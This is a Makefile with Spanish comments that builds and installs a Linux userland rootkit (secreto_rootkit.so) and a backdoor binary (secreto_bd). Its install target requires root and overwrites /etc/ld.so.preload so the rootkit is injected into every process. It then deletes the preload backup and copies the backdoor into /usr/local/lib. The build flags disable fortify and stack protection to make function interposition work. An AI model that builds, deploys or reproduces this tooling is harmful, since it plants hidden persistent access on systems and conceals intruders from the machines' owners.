# Makefile — secreto_linux.c    →  secreto_rootkit.so
#             secreto_backdoor.c →  secreto_bd
#
# Uso:
#   make               → compilar ambos binarios
#   sudo make install  → compilar + instalar + activar preload
#   sudo make remove   → desactivar + eliminar ficheros
#   make clean         → borrar binarios generados

CC      := gcc
# -D_FORTIFY_SOURCE=0      desactiva fortify (interfiere con interposicion)
# -fno-stack-protector     evita referencias a __stack_chk_fail en la .so
# -Wno-cast-function-type  cast de void* -> funcion: esperado en dlsym
CFLAGS_SO := -fPIC -shared -nostartfiles -Wall -Wextra -O2 \
             -D_FORTIFY_SOURCE=0 \
             -fno-stack-protector \
             -Wno-cast-function-type
LDFLAGS_SO := -ldl -lpthread

CFLAGS_BD  := -Wall -O2
LDFLAGS_BD := -lpthread

TARGET_SO   := secreto_rootkit.so
TARGET_BD   := secreto_bd
INSTALL_DIR := /usr/local/lib
PRELOAD     := /etc/ld.so.preload

.PHONY: all install remove clean

all: $(TARGET_SO) $(TARGET_BD)

$(TARGET_SO): secreto_linux.c
	$(CC) $(CFLAGS_SO) -o $@ $< $(LDFLAGS_SO)
	@echo "[+] Compilado: $(TARGET_SO)"
	@echo "    ($$(ls -lh $(TARGET_SO) | awk '{print $$5}'))"

$(TARGET_BD): secreto_backdoor.c
	$(CC) $(CFLAGS_BD) -o $@ $< $(LDFLAGS_BD)
	@echo "[+] Compilado: $(TARGET_BD)"
	@echo "    ($$(ls -lh $(TARGET_BD) | awk '{print $$5}'))"

install: all
	@[ "$$(id -u)" -eq 0 ] || { echo "[-] Requiere root."; exit 1; }
	@[ -f $(PRELOAD) ] && cp $(PRELOAD) $(PRELOAD).bak 2>/dev/null || true
	@echo "" > $(PRELOAD)
	cp $(TARGET_SO) $(INSTALL_DIR)/$(TARGET_SO)
	chmod 644       $(INSTALL_DIR)/$(TARGET_SO)
	cp $(TARGET_BD) $(INSTALL_DIR)/$(TARGET_BD)
	chmod 755       $(INSTALL_DIR)/$(TARGET_BD)
	echo "$(INSTALL_DIR)/$(TARGET_SO)" > $(PRELOAD)
	@rm -f $(PRELOAD).bak
	@echo "[+] Instalado: $(INSTALL_DIR)/$(TARGET_SO)"
	@echo "[+] Instalado: $(INSTALL_DIR)/$(TARGET_BD)"
	@echo "[+] ld.so.preload configurado"

remove:
	@[ "$$(id -u)" -eq 0 ] || { echo "[-] Requiere root."; exit 1; }
	@echo "" > $(PRELOAD) && rm -f $(PRELOAD) || true
	@rm -f $(INSTALL_DIR)/$(TARGET_SO)
	@rm -f $(INSTALL_DIR)/$(TARGET_BD)
	@rm -f /tmp/.secreto_off
	@echo "[+] Rootkit eliminado"

clean:
	rm -f $(TARGET_SO) $(TARGET_BD)
